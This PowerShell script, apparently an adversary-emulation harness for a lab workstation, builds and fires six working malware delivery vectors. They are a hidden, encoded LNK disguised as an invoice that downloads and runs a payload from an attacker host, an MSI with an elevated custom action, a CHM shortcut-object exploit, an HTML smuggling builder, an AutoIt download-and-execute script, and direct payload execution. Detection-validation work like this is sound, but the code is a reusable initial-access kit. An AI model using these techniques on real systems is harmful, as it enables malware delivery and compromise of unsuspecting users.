# H-campaign validation orchestrator — build + trigger all 6 vectors on ws01
# Topology: provisioning (192.168.77.60:8081) = attacker host; ws01 = target (analyst_t1)
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'
$server = 'http://192.168.77.60:8081'
$marker = 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt'

function Check-Marker([string]$tag) {
    $hit = Test-Path $marker
    Write-Output "$tag`_MARKER $hit"
    if ($hit) { Get-Content $marker | ForEach-Object { Write-Output "$tag`_CONTENT|$_" }; Remove-Item $marker -Force }
}

# ---------- H-01 Malicious LNK (provisioning -> ws01 full chain) ----------
Write-Output '===== H-01 LNK ====='
$cmd = "(New-Object Net.WebClient).DownloadFile('$server/payload.exe','C:\Windows\Temp\h01-p.exe');Start-Process C:\Windows\Temp\h01-p.exe"
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
$wshell = New-Object -ComObject WScript.Shell
$lnk = $wshell.CreateShortcut("C:\Windows\Temp\H-01-Invoice.lnk")
$lnk.TargetPath = 'powershell.exe'
$lnk.Arguments = "-WindowStyle Hidden -Exec Bypass -enc $b64"
$lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,1"
$lnk.Description = 'Invoice Q2-2026'
$lnk.Save()
Write-Output "LNK_BUILT $((Get-Item 'C:\Windows\Temp\H-01-Invoice.lnk').Length)"
# simulate the user double-click
Start-Process -FilePath 'C:\Windows\Temp\H-01-Invoice.lnk' -ErrorAction SilentlyContinue
Start-Sleep -Seconds 12
Check-Marker 'H01'
Remove-Item 'C:\Windows\Temp\H-01-Invoice.lnk', 'C:\Windows\Temp\h01-p.exe' -ErrorAction SilentlyContinue

# ---------- H-02 MSI (WiX) ----------
Write-Output '===== H-02 MSI ====='
if (Test-Path "$www\wix\candle.exe") {
    $wxs = @'
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="CADRE Q2 Update" Language="1033" Version="1.0.0" Manufacturer="CADRE Lab" UpgradeCode="11111111-2222-3333-4444-555555555555">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser"/>
    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed."/>
    <Media Id="1" Cabinet="media1.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="CADREH02"/>
      </Directory>
    </Directory>
    <Component Id="PayloadComponent" Guid="*" Directory="INSTALLFOLDER">
      <File Id="PayloadFile" Source="payload.exe" KeyPath="yes"/>
    </Component>
    <Feature Id="MainFeature" Title="Main" Level="1">
      <ComponentRef Id="PayloadComponent"/>
    </Feature>
    <CustomAction Id="RunPayload" FileKey="PayloadFile" ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
'@
    Set-Content -Path "$www\H-02-evil.wxs" -Value $wxs -Encoding UTF8
    Push-Location $www
    & "$www\wix\candle.exe" H-02-evil.wxs -o H-02-evil.wixobj 2>&1 | Select-Object -Last 1 | ForEach-Object { Write-Output "CANDLE|$_" }
    & "$www\wix\light.exe" H-02-evil.wixobj -out H-02-evil.msi 2>&1 | Select-Object -Last 1 | ForEach-Object { Write-Output "LIGHT|$_" }
    Pop-Location
    Write-Output "MSI_BUILT $(Test-Path "$www\H-02-evil.msi")"
    if (Test-Path "$www\H-02-evil.msi") {
        Write-Output "MSI_SIZE $((Get-Item "$www\H-02-evil.msi").Length)"
        Start-Process msiexec -ArgumentList "/i `"$www\H-02-evil.msi`"", '/qn' -Wait -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 6
        Check-Marker 'H02'
        Remove-Item "$www\H-02-evil.msi", "$www\H-02-evil.wixobj", "$www\H-02-evil.wxs" -ErrorAction SilentlyContinue
    }
} else { Write-Output 'H02_WIX_MISSING' }

# ---------- H-03 CHM (hhc) ----------
Write-Output '===== H-03 CHM ====='
if (Test-Path "$www\hhw\hhc.exe") {
    $htm = @'
<html><head><title>CADRE Help Center</title></head>
<body><h1>Update guide</h1>
<OBJECT id=sc type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",C:\Windows\System32\cmd.exe,/c C:\Windows\Temp\payload.exe">
</OBJECT>
</body></html>
'@
    Set-Content -Path "$www\H-03-evil.htm" -Value $htm -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhc" -Value '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN"><HTML><HEAD></HEAD><BODY><UL><LI><OBJECT type="text/sitemap"><param name="Name" value="Welcome"></OBJECT></LI></UL></BODY></HTML>' -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhp" -Value "[OPTIONS]`nCompatibility=1.1 or later`nCompiled file=H-03-evil.chm`nContents file=H-03-evil.hhc`nDefault topic=H-03-evil.htm`nTitle=CADRE Help Center`n`n[FILES]`nH-03-evil.htm" -Encoding ASCII
    Push-Location $www
    & "$www\hhw\hhc.exe" "H-03-evil.hhp" 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output "HHC|$_" }
    Pop-Location
    Write-Output "CHM_BUILT $(Test-Path "$www\H-03-evil.chm")"
    if (Test-Path "$www\H-03-evil.chm") {
        Write-Output "CHM_SIZE $((Get-Item "$www\H-03-evil.chm").Length)"
        Copy-Item "$www\payload.exe" 'C:\Windows\Temp\payload.exe' -Force
        Start-Process -FilePath 'C:\Windows\hh.exe' -ArgumentList "$www\H-03-evil.chm" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 10
        Check-Marker 'H03'
        Get-Process -Name hh -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Remove-Item "$www\H-03-evil.chm", "$www\H-03-evil.htm", "$www\H-03-evil.hhc", "$www\H-03-evil.hhp" -ErrorAction SilentlyContinue
    }
} else { Write-Output 'H03_HHC_MISSING' }

# ---------- H-04 HTML Smuggling (python builder) ----------
Write-Output '===== H-04 HTML Smuggling ====='
python "$www\wt066-html-smuggling.py" "$www\payload.exe" "$www\H-04-smuggle.html" 2>&1 | Select-Object -First 3 | ForEach-Object { Write-Output "H04|$_" }
Write-Output "H04_HTML_BUILT $(Test-Path "$www\H-04-smuggle.html")"
if (Test-Path "$www\H-04-smuggle.html") { Write-Output "H04_HTML_SIZE $((Get-Item "$www\H-04-smuggle.html").Length)" }

# ---------- H-05 AutoIt3 ----------
Write-Output '===== H-05 AutoIt3 ====='
if (Test-Path "$www\AutoIt3.exe") {
    $au3 = @"
Local `$sUrl = "$server/payload.exe"
Local `$sLocal = @TempDir & "\payload.exe"
Local `$sMarker = "C:\Windows\Temp\H-PAYLOAD-MARKER.txt"
InetGet(`$sUrl, `$sLocal)
If FileExists(`$sLocal) Then
    Run(`$sLocal)
    Sleep(5000)
    If FileExists(`$sMarker) Then ConsoleWrite("H05_AUTOIT_MARKER_HIT" & @CRLF)
Else
    ConsoleWrite("H05_DOWNLOAD_FAIL" & @CRLF)
EndIf
"@
    Set-Content -Path "$www\H-05-evil.au3" -Value $au3 -Encoding ASCII
    & "$www\AutoIt3.exe" "$www\H-05-evil.au3" 2>&1 | Select-Object -First 3 | ForEach-Object { Write-Output "H05|$_" }
    Start-Sleep -Seconds 8
    Check-Marker 'H05'
    Remove-Item "$www\H-05-evil.au3" -ErrorAction SilentlyContinue
} else { Write-Output 'H05_AUTOIT_MISSING' }

# ---------- H-06 Malicious EXE (payload.exe direct) ----------
Write-Output '===== H-06 Malicious EXE ====='
Copy-Item "$www\payload.exe" 'C:\Windows\Temp\payload.exe' -Force
Start-Process -FilePath 'C:\Windows\Temp\payload.exe' -ErrorAction SilentlyContinue
Start-Sleep -Seconds 4
Check-Marker 'H06'

Write-Output 'H_RUN_ALL_DONE'
